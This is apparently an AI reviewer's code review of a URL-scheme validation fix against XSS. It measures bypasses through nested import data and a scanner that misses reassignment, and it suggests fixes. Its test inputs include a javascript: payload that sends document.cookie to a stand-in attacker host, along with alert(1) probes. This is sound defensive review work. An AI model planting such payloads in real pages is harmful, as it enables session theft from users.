# url-scheme-validation-r2 @ `6805daa` — Code Review (review-xss-r3)

**Tree:** `git rev-parse HEAD` = `6805daa32aa67992bb26a4e66bd9d102bbf6fa53` ✔ matches §1.
**Range reviewed:** `0bc9b72..6805daa` — 6 commits, 14 files, +2098 / −173 ✔ matches §1.
**Reading order:** I read `_xss-r3-baseline-block.md` in full, then the `code-review`
skill, then did the §0 open pass below. **I did not read ahead** into the R1–R7 item
list until §0 and all of its measurements were complete, and I did not read
`dev-xss-r3.md` at all. Everything in §0 was found from the diff and the tree.

Evidence tags per §3: `[MEASURED]` = run by me, this session, in this tree.
`[INFERENCE]` = reasoned, not run. `[REPORTED — who]` = relayed.

---

## §0 — OPEN PASS (written first, before the item list)

Question asked: *what does this diff put at risk?*

The diff's thesis is that a URL can leave the server by more carriers than the one
typed field anybody validated. I took that thesis seriously and applied it to the
diff itself: **if the fix enumerates carriers, which carriers does the fix's own
enumeration miss?** I enumerated rather than grepped, per §3.

Five things surfaced. Four became findings; one became a green control.

### 0.1 The scrub is top-level only, and nesting is real in this tree `[MEASURED]`

`sanitizeRemoteData` (`internal/server/urlvalidate.go:196`) iterates `for k, v := range rd`
and classifies `k`. It never descends. `issueBuildRemoteData`
(`internal/platform/github/graphql_queries.go:495`) writes a **nested map** today:

```go
rd["parent"] = map[string]any{"node_id": ..., "number": ...}
```

So nesting is not hypothetical. `"parent"` is not URL-bearing by name, so its
contents are never examined. Measured:

```
sanitizeRemoteData({"parent": {"html_url": "javascript:alert(1)", "number": 1}})
  -> map[parent:map[html_url:javascript:alert(1) number:1]]     // survives intact
```

Green control in the same run: `{"links": []any{"javascript:..."}}` **is** dropped —
`links` is URL-bearing and the value is not a string, so it fails closed. That half
works.

### 0.2 The import boundary has the same hole, and it is the untrusted one `[MEASURED]`

This is the finding I consider the round's real one. `urlvalidate.go:218` documents
the exact threat model: *"a check placed only in UpdateTask is bypassable by importing
a collection"*, because `ImportCollection` copies `RemoteData` **verbatim out of a
caller-uploaded JSON document**. `validateImportedTaskURLs` was correctly widened to
walk all keys — but only the **top level**, the same as the read path.

Measured end-to-end, with a control that differs **only in nesting depth**:

| input | import validation | read-path scrub | reaches wire? |
|---|---|---|---|
| `{"html_url": "javascript:alert(1)"}` | **rejected** `InvalidArgument … scheme "javascript" is not allowed` | stripped → `{}` | no |
| `{"parent": {"html_url": "javascript:fetch('//attacker/'+document.cookie)"}}` | **`nil` (accepted)** | **survives verbatim** | **yes** |

Wire payload actually produced:

```
fields:{key:"parent" value:{struct_value:{fields:{key:"html_url"
  value:{string_value:"javascript:fetch('//attacker/'+document.cookie)"}} …}}}
```

The value crosses both boundaries the commit exists to close, on the one path whose
input is attacker-supplied by design. This is a **positive-outcome** non-vacuity
result, not an oracle-can-fire result: the defect is reached by real input.

**Important credit, found after the above:** the author *knows* about nesting and
guards it — see §R1. That guard scans **adapter source files**. It cannot say
anything about caller-uploaded JSON, which has no adapter. So the guard and the hole
do not overlap.

### 0.3 Collections are a second, entirely unsanitized carrier `[MEASURED]`

`convert.go:358` (tasks) was fixed. `convert.go:530` (collections) was not:

```go
pc.RemoteData, _ = structpb.NewStruct(c.RemoteData)   // no sanitizeRemoteData
```

and `export_import.go:332` copies `doc.Collection.RemoteData` verbatim from the same
uploaded document. Same shape, same escape hatch, same import path, no scrub.

**Green control, reported at equal weight (§3):** I enumerated every consumer of
collection `remoteData` in the web tree rather than assuming. There are exactly two —
`capabilities.ts:98` and `ft-app.ts:256` — and **both read only the boolean
`rd.writable`**. Neither renders it. So this is an asymmetry and a latent hole, **not
a live sink.**

### 0.4 `blankNonCode` mis-counts braces on a shape this codebase is full of `[MEASURED]`

`url-binding-scan.test.ts` blanks comments and quoted strings before brace-walking,
and documents its residual risk as *"a lone `{` or `}` in template HTML text. Nothing
in this tree has one."* That understates it. An **apostrophe** in template text
(`don't`, `can't`) opens a single-quote blanking run, which terminates at end of
line. If a multi-line `${` interpolation follows on that line, the opening brace is
blanked and its closing brace — on a later line — is not.

Extracted the real `blankNonCode` from the source and ran it (first attempt was
faulty — see §Controls):

| input | raw depth | blanked depth | |
|---|---|---|---|
| `// const href = safeHref(x);` | 0 | 0 | control: comments blank ✔ |
| ``html`<span>its ${\n compute()\n}</span>` `` | 0 | 0 | control: no apostrophe ✔ |
| ``html`<span>it's ${\n compute()\n}</span>` `` | 0 | **−1** | ***SKEWED*** |

Depth −1 makes `enclosingBlock` select the wrong opening brace and **widen** the
block — which is precisely the fail-open direction that commit `42d62a4` exists to
close. **Latent, not live:** none of the four allow-listed files contains the trigger
shape (the three files that do are `ft-tree-node.ts`, `ft-command-palette.ts`, and the
scanner's own source).

### 0.5 `structpb` silently eats the whole map, in four places `[MEASURED]`

`structpb.NewStruct` rejects `[]string` outright (`proto: invalid type: []string`),
and `issueBuildRemoteData` writes `"labels": []string`. The error is discarded with
`_`, so `pt.RemoteData` becomes `nil` and the entire map vanishes. Enumerated the
discarded errors on the conversion path rather than grepping for the one I expected:
**there are four** — `convert.go:358, 530, 555, 558`.

### Did the open pass find anything the item list would have missed?

**Yes — one, and it is the finding I rate highest.** §0.2 (nested URL carrier through
the *import* boundary) is not reachable from R1–R7. R1 asks whether
`sanitizeRemoteData` recurses, which reaches §0.1 — the *read* path, where the value
is adapter-written and the adapter-source guard applies. It does not ask about
`validateImportedTaskURLs`, and that is where the untrusted input enters and where the
adapter guard has no purchase. §0.3 (collections) is likewise outside every item.

This is a non-null result for the §0 practice.

---

## Executive Summary

The change is a substantial, unusually honest improvement: it replaces false comments
with measured ones, closes two confirmed scanner fail-opens, and adds real
anti-vacuity machinery. It also ships **a third scanner fail-open of the same class it
just fixed**, and leaves the nested-key carrier open on the **import** boundary — the
one path the code's own docblock identifies as attacker-supplied.

**Risk level: MEDIUM.** No live XSS: I enumerated the web consumers and `remote_data`
reaches no `href` sink today. Every finding below is a hole in a security boundary
with no current sink behind it, which is exactly the configuration that becomes
Critical the day someone renders `remote_data`.

---

## Critical

**None.** Stated with the evidence, since a null here is load-bearing: I enumerated
every consumer of `remoteData`/`remote_data` in `web/src` (`capabilities.ts:98`,
`ft-app.ts:256`, `gen/types.ts`, `gen/grpc-client.ts`, `store/task-store.ts` comment).
The only reads are of the boolean `writable`. The inspector's External Source row is
driven by the **typed** `t.remoteUrl` (`ft-inspector-meta.ts:628`), which is guarded
by `safeHref`. So no unsanitized `remote_data` value reaches an `href` at this commit.

---

## Required

### RQ-1 — Nested URL carriers cross the import boundary unvalidated `[MEASURED]` — OPEN PASS

`internal/server/urlvalidate.go:226` (`validateImportedTaskURLs`) and
`urlvalidate.go:196` (`sanitizeRemoteData`) both walk only the top level. Measured
table in §0.2: `{"parent":{"html_url":"javascript:…"}}` is accepted by import
validation, survives the read-path scrub, and serialises onto the wire — while the
identical value one level up is rejected by both.

The in-tree guard `TestRemoteDataKeysWrittenByAdaptersAreClassified`
(`urlvalidate_differential_test.go:524`) asserts no **adapter-written** nested key is
URL-bearing, and its error text says *"Either flatten it to a top-level key or teach
`sanitizeRemoteData` to recurse."* That guard reads adapter **source files**
(`graphql_queries.go`, `github.go`, `beads.go`). Imported JSON has no source file, so
the guard is structurally incapable of covering it. The commit is titled *"Scrub every
URL carrier out of `remote_data`"*; on the import path it scrubs the top level only.

**Suggested fix.** Make `sanitizeRemoteData` recurse into `map[string]any` and
`[]any`, and make `validateImportedTaskURLs` use the same recursive walk, so the two
boundaries continue to classify identically — the property `urlvalidate.go:220`
correctly identifies as the root cause of the original `html_url` miss. Recursion also
retires the nested-key invariant test as a *constraint* (it can stay as a
documentation check). If recursion is judged too broad, the alternative is to reject
nested maps outright at the import boundary — but recursion is the smaller change and
removes a moving piece rather than adding one.

### RQ-2 — A third scanner fail-open: a guard reinstated by later reassignment `[MEASURED]` — BOTH (R7 asked; open pass reached it too)

`url-binding-scan.test.ts:774` checks a `viaSafeHref` binding with:

```ts
block.some((l) => assignsFromSafeHref(l, id!))
```

`.some()` asks whether **any** line in the block assigns the identifier from
`safeHref`. It does not ask whether another line reassigns it from something else.
`assignsFromSafeHref` was hardened to reject `safeHref(url) || url` on a single line;
splitting that across two lines walks straight through.

Measured against the real tree — mutated `ft-inspector-meta.ts` to:

```ts
let href = safeHref(remoteUrl);
href = remoteUrl;          // reinstates the unvalidated value
```

Result: **`url-binding-scan: ok`** — the scanner passed. The suite went red only
because the behavioural render test in `safe-url.test.ts` independently caught the
live anchor:

```
Error: ft-inspector-meta.ts::renderExternalSourceLink: a javascript: URL must not
produce an anchor at all, got: <a … href="javascript:fetch('//attacker/'+document.cookie)">
```

This is the situation the author themself names as disqualifying in the R6 context:
*"a rule that only fires when another test would have caught it anyway is not a rule."*
It matters because the scanner is explicitly the **chokepoint** for bindings that have
no render test — its stated purpose is to stop *the next* binding someone adds, which
by definition has no `safe-url.test.ts` coverage.

**Suggested fix.** Require the identifier to be assigned **exactly once** in the block
and that assignment to be from `safeHref`. Concretely: keep the existing
`assignsFromSafeHref` positive match, and add a negative — no other line in the block
matches the bare LHS pattern `(?:^|[^\w$.])<id>\s*=(?![=>])` unless it also satisfies
`assignsFromSafeHref`. That is a few lines, reuses the regex already present, and
turns `.some()` into the "and nothing else" property the docblock already claims.

### RQ-3 — `blankNonCode` brace skew re-opens the D1(b) laundering hole `[MEASURED]`

Measured table in §0.4: an apostrophe in template text plus a multi-line `${`
interpolation yields blanked depth **−1** against raw depth 0, with two green controls
(comment blanking works; the same input without the apostrophe is balanced). A
negative depth makes `enclosingBlock` pick the wrong opener and widen the block; the
comment at `url-binding-scan.test.ts` argues at length that widening is *exactly* the
failure mode for a security check, which is why `42d62a4` was written.

Latent today — no allow-listed file contains the shape — but `don't` / `can't` /
`you're` in UI copy is ordinary, and the file's stated residual risk ("a lone `{` or
`}`") does not mention it. Under this project's standing rule, a residual-risk
statement that omits the likelier trigger is a defect, not a nit.

**Suggested fix.** Cheapest robust move: after computing `enclosingBlock`, assert the
returned block is brace-balanced and **hard-fail** if it is not. That converts a
silent widening into a loud error without needing a template-literal-aware blanker,
and it is in the same spirit as the runner's `requireCanonicalTestNames` chokepoint.
Also correct the residual-risk comment to name the apostrophe case.

### RQ-4 — Collection `RemoteData` is unsanitized, and the error discard is unenumerated `[MEASURED]`

`convert.go:530` serialises collection `RemoteData` with no scrub, fed verbatim from
uploaded JSON at `export_import.go:332`. No sink today (green control in §0.3), but it
is the identical carrier the task path just fixed, and the asymmetry is undocumented —
a reader of `sanitizeRemoteData` would reasonably assume both call sites were covered.

Relatedly, `urlvalidate.go` and the test comments discuss *the* discarded error;
there are **four** (`convert.go:358, 530, 555, 558`), of which `555`/`558`
(`structpb.NewValue` on changelog old/new values) are unexamined by this diff.

**Suggested fix.** Either call `sanitizeRemoteData` at `convert.go:530` (one line,
consistent with the task path), or add a comment stating why collections are exempt.
Do not leave it silent. The four discards deserve one sentence saying which are
intentional.

### RQ-5 — `noteDeclaresBaseDependence` still matches substrings of prose `[MEASURED]` — ITEM LIST (R6)

`urlvalidate_differential_test.go`:

```go
return strings.Contains(strings.ReplaceAll(lower, "not base-dependent", ""), "base-dependent")
```

The fix removes one specific negation. Measured:

| note | result | correct? |
|---|---|---|
| `"base-dependent host resolution"` | true | ✔ |
| `"not base-dependent."` | false | ✔ |
| `"never base-dependent."` | **true** | ✘ inverted |
| `"isn't base-dependent."` | **true** | ✘ inverted |
| `"no longer base-dependent."` | **true** | ✘ inverted |
| `"this is not base-dependent, unlike the base-dependent case above"` | true | ✔ |

R6 predicted this precisely (*"Substring matching on prose is the mechanism; it may
appear more than once"*) — and it recurs inside the **corrected** function, not
merely elsewhere. Latent: all seven current notes use the handled `"Not
base-dependent:"` phrasing.

**Suggested fix.** Stop parsing English. The fixtures already carry a structured
`base_dependent` boolean; require the note to contain an explicit machine token
(e.g. `base_dependent=true` / `base_dependent=false`) and compare tokens. That removes
the natural-language layer entirely instead of adding another negation to strip.

---

## Nit / Optional

- **OPT-1 — the assertion receipt is forgeable `[MEASURED]` (R3).** A file that
  imports nothing and does `console.log('#assertions 99')` passes and inflates the
  suite total from 315 → 414. Measured: exit 0. The `assertions.ts` docblock is
  admirably candid about `assert(true)` padding but does not mention that the harness
  can be bypassed entirely. Given the gate's stated purpose (catch a contributor
  gutting a test, not an attacker) this is acceptable — a gutted file loses its
  receipt or reports 0 and *is* caught. Worth one sentence in the docblock; a robust
  fix is a per-run nonce in the prefix, passed to the child via env.
- **OPT-2 — early `process.exit()` truncates silently `[MEASURED]` (R3).** A file
  asserting once then calling `process.exit(0)` reports `#assertions 1` and passes.
  The floor is `n > 0`, so any truncation past the first assertion is invisible. In
  scope of "a floor on vacuity, not a measure of coverage", but the specific
  `process.exit` path is worth naming since R3 asked.
- **OPT-3 — `MIN_FILES = 40` is a magic number that will rot (R5).** Measured: 52
  non-test `.ts` files across **12** directories. The three witnesses cover 3 of the
  12 (`components/inspector`, `components/dependency`, `util`), leaving `components/kanban`,
  `minimap`, `ready-queue`, `tree`, `gen`, `store`, `utils`, `components`, and `src`
  unwitnessed. A walk that stopped descending into the four unwitnessed component
  subdirectories could still clear 40. **Non-magic formulation:** assert the walk
  reaches **every directory under `src/` that contains a `.ts` file** — computable
  from the walk itself, needs no constant, and cannot slide as the tree grows.
- **OPT-4 — `isTestShaped` false-positives on non-TS files.** `walkAll` returns every
  file under `src/`; the extension strip only handles `.[cm]?[jt]sx?`. A fixture named
  `src/util/test-data.json` would hard-fail the build telling the author to rename it
  to `.test.ts`. "Erring broad is the point" is stated and defensible, but the failure
  message would be actively wrong for a non-TS file. Cheap fix: only apply the check to
  files whose extension matches the script pattern.
- **NIT-1 — `web/src/util/` and `web/src/utils/` both exist** (the latter holds
  `task-ready.test.ts`, touched by this diff). Pre-existing, but the diff adds two new
  files to `util/` and so entrenches the split.

---

## FYI

- **`go test ./...` is flakier than §2 states `[MEASURED]`.** Baseline says green with
  `TestWatchTasks` flaking ~8%. I measured **2 RED in 8 valid full-suite runs (25%)**,
  both `TestWatchTasks_NoInitial` (a 5.00s timeout), both during periods of heavy
  concurrent load. The same test passed `-count=8` in isolation and the package alone
  passed. The base commit `0bc9b72`, once properly provisioned, was green 4/4. **Not
  caused by this diff** — it touches `urlvalidate.go`/`convert.go`, not the watch path.
  Two notes for the brief: the actual name is `TestWatchTasks_NoInitial`, and 8% looks
  low for a load-sensitive timeout.
- **`html_url` was a latent leak, not a live one (R2, answered in full below).**
- **Citations resolve.** Per §5's corollary I checked every file:line the new comments
  cite: `graphql_queries.go:482` ✔, `github.go:261` ✔, `ft-inspector-meta.ts:628` ✔,
  `ft-app.ts:766` ✔, `ft-toolbar.ts:701` ✔, `ft-dependency-view.ts:1378` ✔. **Six for
  six.** Given that two of three citations in the last fix brief pointed past
  end-of-file, this is a real and measurable improvement.

---

## Positive Feedback

Specific, not manufactured:

- **`TestRemoteDataKeysWrittenByAdaptersAreClassified` is the best thing in the diff.**
  It converts an unbounded invariant into a bounded, enforceable one, and it carries
  **two positive controls** — `remote_url`/`html_url` must be found top-level, and
  `percent_completed` must be found *nested*. The second is a genuine count-neutral
  control in the §3 sense: it holds the key count fixed and corrupts only the
  top/nested attribution, so a collapsed nesting stack is caught rather than silently
  making the nested rule vacuous. That is the bar the baseline block asks for, met
  without being asked.
- **The `passthrough_url_test.go` comment refusing to write a vacuous assertion.** It
  identifies that "remote_url is absent from remote_data" would pass against a
  completely unsanitized `taskToProto`, declines to write it, and installs a tripwire
  (`len(fields) != 0`) with an error message telling a future maintainer what to
  upgrade when the `[]string` issue is fixed. That is exactly right.
- **The scanner's two confirmed fixes work on the real tree, not just on fixtures.** I
  verified both by mutation rather than by reading: defeating the guard with
  `safeHref(remoteUrl) || remoteUrl` produced the precise "AND NOTHING ELSE" failure
  (M1), and adding a fresh unguarded `href=${remoteUrl}` binding was caught as an
  unapproved binding at the correct line (M2). Recall and the guard-trace both fire on
  live code.
- **Comment honesty.** `b06121f` repeatedly quotes the previous wrong sentence, says
  what was measured, and states what the mechanism does *not* buy — the `safeHref`
  host-guard note ("a partial backstop, not a fail-closed one") and the
  `testing.go` note ("a SPEED BUMP, NOT A BARRIER") are both corrections *against the
  author's own interest*. RQ-3 and RQ-5 are failures of this standard, which is worth
  saying only because the standard is otherwise met.

---

## Verdict on each item R1–R7

**R1 — is a word set a property? — PARTIALLY AGREE with the brief's worry.**
Characterised by measurement, not summary:

| key | classified | key | classified |
|---|---|---|---|
| `html_url`, `htmlUrl`, `HTMLURL` | true | `curl` | false ✔ |
| `remote_url`, `web_url`, `avatar_url` | true | `url2`, `urlx` | **false** |
| `issue_link`, `permalink`, `href`, `URI` | true | `u_r_l` | false |
| | | `source`, `endpoint`, `callback`, `homepage` | false |

The implemented invariant is **"the key names a URL"**. The invariant the surrounding
code needs is **"the value is a URL"**. They do not coincide, and the code says so
plainly and fails closed on the naming axis. I think name-based is the **right** call
here: value-based classification on an arbitrary escape-hatch map means validating
every string, which turns any string that merely parses as a URL into a rejection —
far worse false-positive behaviour on a read path that must not fail. The word set is
a list, but it is a list over a *bounded, human-scale* vocabulary backed by an
enforced adapter-key invariant, which is a genuinely different thing from the
one-element list it replaced.
**Recursion: NO, and it matters — RQ-1.** Non-string values are dropped, which is
correct and fail-closed (measured). *Silently* dropped is acceptable on a read path
whose stated policy is degrade-don't-error, and the policy is documented at the call
site.

**R2 — premise CONFIRMED. See dedicated section below.**

**R3 — the gate can be satisfied without being obeyed. AGREE, with the brief's own
mitigation.** Forgeable (OPT-1, measured) and truncatable (OPT-2, measured). Both
matter less than they sound because the gate targets accidental gutting, which it does
catch. The `tsconfig.test.json` pin **does** catch real drift, not just its spelling:
it asserts exact array equality against `["src/**/*.test.ts"]`, so *any* edit —
widening, narrowing, reordering, adding a second entry — fails. That is stronger than
I expected and I record it as a green control. `writeSync(1, …)` is reliable on the
normal and `process.exit` paths (measured); it will not run on `SIGKILL`/segfault, but
those produce a nonzero status and are caught by the status check first.

**R4 — template literals are NOT handled, and it does produce a false ACCEPT. AGREE —
RQ-3.** Deliberately left intact per the comment; the apostrophe interaction is the
part the comment misses. Of the shapes R4 lists, the apostrophe case is the one I
could drive to a measured depth skew. On the brief's follow-up question — **is brace
depth the right scope at all?** No, and RQ-2 is the proof: a guard and a bare
reassignment *in the same method* launder each other under any block-level scope. The
scope fix was necessary but the mechanism needs the "assigned exactly once" property,
which is scope-independent.

**R5 — the floor will rot. AGREE — OPT-3**, with a concrete non-magic replacement
(every `.ts`-containing directory must be reached). The witnesses are indeed the
stronger half; three is not enough at 12 directories. The comment's "52 files" figure
is **accurate** (measured: 52 non-test `.ts`).

**R6 — the same class of error recurs inside the corrected function. AGREE — RQ-5.**
On the brief's other two R6 questions: the control test's positive case **is**
load-bearing — the eight negatives alone would pass with the rules disabled, so
without the positive the control would be vacuous; it is present, which is correct.
**Minimum length is a proxy that a bad note satisfies trivially** — padding prose
clears it. It is harmless but it is not a quality measure, and I would not defend it
as one.

**R7 — yes, there is a third fail-open shape. RQ-2.** Assumed one existed and went
looking, as instructed; found it by mutation on the real tree. It is the same class as
D1(a) — reinstating the unvalidated value — reached by reassignment instead of by the
right-hand side, and it defeats the hardened `assignsFromSafeHref` completely because
that function only ever sees one line at a time.

---

## R2 in full — is `remote_data` always nil on the passthrough path?

**Confirmed independently, before reading the claim's justification.** `[MEASURED]`

```
structpb.NewStruct({"remote_url":…, "html_url":…, "labels": []string{"bug"}})
  -> struct=<nil>  err=proto: invalid type: []string
```

Control, same map with `[]any` labels: serialises fine, **and** the sanitizer strips
both `remote_url` and `html_url`. So the `nil` is caused by the `[]string`, not by
anything else, and the sanitizer is functional once the map can serialise at all.

**What was the original `html_url` carrier reachable through?** Not the GitHub
passthrough read — that path's map never serialises. So `54c46cc` closes a **latent**
leak on that path and a **live** one elsewhere: any `RemoteData` that *does* serialise.
The beads adapter (`beads.go:383`) writes no `[]string` in its base map, and the
**import** path accepts arbitrary caller JSON — which is where I demonstrated a value
actually reaching the wire (§0.2). So the commit's real value is on the import/beads
side, and the passthrough motivation in the commit message is the weakest part of its
own rationale.

**Was pinning the `nil` rather than fixing the `[]string` the right call?** Yes, and I
would defend it. Fixing `labels` to `[]any` is a visible wire-format change —
`remote_data` would go from absent to populated for every GitHub task, changing what
the dashboard receives — and shipping that inside a security round would mean the
security fix and a behaviour change share a bisect point. The tripwire in
`passthrough_url_test.go` is the right artefact: it fails the moment the `[]string`
is fixed and tells the author to upgrade the assertions. The odd part the brief
identifies is real — a test asserting data loss — but it is labelled as a guard, not
as desired behaviour, and it names its own successor. That is a defensible merge.
**It does need a tracked follow-up**, which I do not see filed anywhere in the diff.

**Is `_` the only discarded error?** No — **four** (§0.5, RQ-4).

---

## Test Coverage

New paths are well covered on the axes the author chose, with genuine positive
controls (see Positive Feedback). Gaps, all of which map to findings above:

- No test covers `validateImportedTaskURLs` or `sanitizeRemoteData` with a **nested**
  map (RQ-1). The nested invariant that *is* tested covers adapter source only.
- No test covers `collectionToProto`'s `RemoteData` at all (RQ-4).
- `assignsFromSafeHref` has 5 guarded and 10 not-guarded fixtures — good — but none
  exercises **two lines** (RQ-2), which is the shape that defeats it.
- `noteDeclaresBaseDependence` has no fixture for a negation other than
  `"not base-dependent"` (RQ-5).

## Backward Compatibility

No wire-format change. `pb.Task.remote_data` may now contain **fewer** keys for
clients whose stored `RemoteData` holds a URL-bearing key with an invalid value or a
non-string value — a deliberate, documented tightening. No fields removed, no new
required fields. `SetTestGraphQLClient`'s signature changes from `testing.TB` to a
local `testHandle` interface; `*testing.T` satisfies it, both in-tree callers compile,
and it removes `testing` from the shipped binary's dependency graph — a small
improvement.

---

## Controls, including one that caught my own error

Reported per §2's instruction that a control catching your own mistake is worth
reporting.

1. **`web/dist` quiet trap — reproduced, in my own control.** I created a base-commit
   worktree at `0bc9b72` to compare `go test`. It returned **exit 1 three times with
   zero `--- FAIL` lines**. Reading the message text rather than the exit code:
   `assets.go:5:12: pattern all:web/dist: no matching files found` — `web/dist` is
   untracked and does not follow into a new worktree. I had manufactured exactly the
   false baseline §2 warns about. Provisioned the worktree and re-ran: **green 4/4**.
   Without reading message text I would have filed "the base is also red" and drawn
   the opposite conclusion about the flake.
2. **`matched no packages` — also mine.** Four `go test ./...` runs returned exit 1
   with no failures because the shell's cwd had persisted at `/workspace/web` after an
   `npm` command. Only `go: warning: "./..." matched no packages` distinguished it. All
   four discarded; re-run from `/workspace` with an explicit `cd`, all green.
3. **My first `blankNonCode` probe was wrong and I caught it.** Extracting the function
   and stripping TypeScript `!` non-null assertions with a blanket
   `.replace(/!/g,'')` also inverted every `!==`, so the function silently did nothing
   and all four cases read "ok". Detected via a sanity check that the extracted source
   still contained `!==`; re-extracted stripping only `]!`/`)!`. The skew in §0.4 is
   from the corrected probe, with comment- and string-blanking controls passing.
4. **Verified provisioning before measuring:** `go vet` produced exactly 4
   `copies lock value` at `server.go:1509,1619,1827,2004` and **0** `web/dist`
   messages, matching §2 exactly. No gate command was piped.

### Gate table as measured by me

| gate | §2 says | I measured | |
|---|---|---|---|
| `go build ./...` | 0 | **0**, zero output | ✔ |
| `go vet ./...` | 1, exactly 4 copylocks | **1**, exactly 4, at the stated lines, 0 `web/dist` | ✔ |
| `go test ./...` | 0 | **0** on 6 of 8 valid runs; 2× `TestWatchTasks_NoInitial` | ⚠ see FYI |
| `npm run build` (web/) | 0 | **0** | ✔ |
| `npm test` (web/) | 0, `PASS: 4 test file(s), 315 assertions` | **0**, `PASS: 4 test file(s), 315 assertions` | ✔ |

---

## Numbered list of everywhere this brief is wrong

1. **`go test ./...` is not reliably green (baseline §2).** 2 RED in 8 valid runs
   (25%), not ~8%. The brief also names the flake **`TestWatchTasks`**; the actual
   failing test is **`TestWatchTasks_NoInitial`**. §2 instructs matching by name, so
   the imprecise name works against its own rule.
2. **Baseline §7 claim 2 is false as stated** — *"the scanner fixes are complete for
   the two fail-open shapes it confirmed."* The two named shapes are genuinely fixed
   (M1, M2). A **third** shape of the same class survives (RQ-2), and the brief's own
   R7 was right to assume one existed. §7 presents the claim as merely unverified when
   it is refutable.
3. **R1 mis-frames the nesting question as unexplored** — *"I have not measured whether
   nesting is reachable"* — and, by asking only about `sanitizeRemoteData`, steers
   toward the read path. Nesting is reachable (`issueBuildRemoteData` writes `parent`),
   the author **already guards it** for adapters, and the actual hole is on
   `validateImportedTaskURLs` — which no item mentions. This is a live instance of the
   §5 Mode 3 the brief warns about; §0 is what caught it.
4. **R2's *"convert.go discards an error with `_`. Is that the only place?"* presumes
   the singular.** There are four (`convert.go:358, 530, 555, 558`). The question is
   posed well enough to find them, but the framing throughout the brief and the code
   comments treats it as one.
5. **R1's parenthetical word list is wrong in one entry.** It lists the matched set as
   "`url`, `uri`, `href`, `link`, `permalink`, plurals". `permalinks` is present, but
   the brief omits that the all-caps fallback is a **suffix** test, which is what makes
   `HTMLURL` match and is a materially different rule from whole-segment matching.
6. **R5 states "52 measured" without attribution.** It is correct (I measured 52
   non-test `.ts`), but per §3 the brief should have tagged it; a §5 Mode 2 count that
   happens to be right is still an unmeasured count from the reader's side.
7. **The baseline's framing of §0 as possibly-null undersells the setup.** Not an
   error against me, but recorded because the brief asks for the judgement: the open
   pass was **not** null here, and the specific reason is that the item list was
   organised by *commit* while the defect lives in the seam *between* two functions
   that different commits touched. Item lists derived from a commit list will
   systematically miss cross-boundary asymmetries.
8. **R3 asks whether `writeSync` is reliable "in every exit path the runner can
   produce"** — but the runner cannot produce most of those paths; the child chooses
   them. The question is answerable only against the test files, and for the ones that
   exist the answer is yes.

---

## Dirty cells

**Zero.** All probe work was reverted by snapshot restore (`cp` from `/tmp/snap`), not
`git checkout`, per §4.

Probes created and removed: `internal/server/zz_probe_reviewer_test.go`,
`zz_probe2_test.go`, `zz_probe3_test.go`, `web/src/util/zz-forge.test.ts`,
`web/src/util/zz-exit.test.ts`. Production files mutated and restored from snapshot:
`web/src/components/inspector/ft-inspector-meta.ts` (M1, M2, M3). Throwaway git
worktree at `/tmp/basewt` created and removed (`git worktree list` shows only
`/workspace`). Nothing committed. **Nothing pushed.**

```
$ git status --porcelain
$ git rev-parse HEAD
6805daa32aa67992bb26a4e66bd9d102bbf6fa53
$ cd web && npm test
PASS: 4 test file(s), 315 assertions.
```

(`git status --porcelain` produced no output — the tree is clean.)

---

## Final Verdict

**REQUEST CHANGES**

Blocking: **RQ-1** (nested URL carrier crosses the import boundary — measured to the
wire), **RQ-2** (third scanner fail-open, measured on the real tree), **RQ-3**
(`blankNonCode` brace skew re-opens block widening), **RQ-4** (collection carrier
unsanitized; four discarded errors), **RQ-5** (prose substring matching inverts three
common negations).

This is a good change and I want to be clear that the verdict is not a judgement on
its quality — it is meaningfully better than what it replaces, and its
self-documentation standard is higher than most code I review. But it is a security
change whose entire thesis is *"we missed a carrier because two boundaries classified
keys differently"*, and it ships with two boundaries still classifying nested keys
differently, plus a guard-checker that approves a defeated guard. RQ-1 and RQ-2 are
the same mistake the branch exists to fix, one layer down.

**Separately, and not blocking this diff:** the `[]string`/`structpb` data-loss bug
(R2) is correctly deferred but I see no tracked follow-up for it, and the
`convert.go:555/558` discards are unexamined by anyone. Both are out of this diff's
scope; both should be filed before this merges so they are not carried by the
tripwire comment alone.

**Recommendation to the dispatcher:** RQ-1 and RQ-2 are narrow, well-localised fixes
(recursion in one helper; `.some()` → "exactly once" in one check). This does not need
a redesign round. Given that RQ-2 was found by mutation and RQ-1 by an
enumerate-the-boundaries pass, a **security-auditor** pass on the *import* path
specifically would be worth more than another review round — I did not threat-model
that path beyond establishing there is no current `href` sink, and that is the audit
leg's lane rather than mine.
